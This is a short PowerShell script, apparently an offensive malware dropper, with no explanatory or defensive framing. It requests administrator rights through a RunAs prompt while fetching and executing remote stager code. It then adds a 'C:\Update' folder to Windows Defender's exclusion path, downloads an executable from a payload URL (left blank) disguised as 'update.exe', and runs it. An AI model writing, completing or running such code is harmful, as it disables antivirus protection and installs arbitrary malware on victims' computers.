$stagerurl=""
$payloadurl=""

if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
Start-Process powershell "[scriptblock]::Create((Invoke-WebRequest $stagerurl).Content).Invoke();" -Verb RunAs
 }
 mkdir "c:\Update";
 Add-MpPreference -ExclusionPath "C:\Update"
reg query "HKLM\Software\Microsoft\Windows Defender\Exclusions\Paths"
Invoke-WebRequest -Uri $payloadurl -OutFile "C:\update\update.exe"
C:\update\update.exe
